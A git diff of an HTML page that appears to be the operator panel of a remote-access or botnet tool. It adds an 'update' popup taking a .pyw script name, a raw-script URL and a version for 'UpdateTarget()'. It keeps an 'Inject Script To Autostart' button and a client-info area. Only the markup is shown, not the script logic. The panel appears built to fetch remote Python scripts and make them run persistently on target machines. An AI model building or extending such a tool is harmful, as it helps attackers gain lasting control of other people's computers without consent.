@@ -24,8 +24,23 @@
     </main>
 
     <div id="popup" class="widziszMnie">
-        <button class="exit" onclick="popupClose()">X</button>
+        <div class="console_top">
+            <div class="update" ></div>
+            <button class="exit" onclick="popupClose(`#popup`)">X</button>
+        </div>
+        
         <div id="main">
+
+            <div id="update_popup" class="widziszMnie">
+                <span>
+                    <input placeholder="Script Name (example.pyw)" type="text" name="filename" id="update_name">
+                    <input placeholder="URL to Raw Script" type="text" name="fileurl" id="update_url">
+                    <input placeholder="Version (X.X)" type="text" name="filever" id="update_ver">
+                </span>
+                
+                <button onclick="UpdateTarget()">Update</button>
+                <button onclick="popupClose(`#update_popup`)">Fuck Go Back</button>
+            </div>
             
             <div id="console">
                 <img src="./assets/XD.gif" alt="XD">
@@ -39,7 +54,7 @@
             <span>
                 <span class="script">
                     <input placeholder="Script Name (example.pyw)" type="text" name="filename" id="filename">
-                    <input placeholder="URL to Script" type="text" name="fileurl" id="fileurl">
+                    <input placeholder="URL to Raw Script" type="text" name="fileurl" id="fileurl">
                     <button onclick="InjectScript()" id="injectButton">Inject Script To Autostart</button>
                 </span>
                 <span id="client_info"></span>
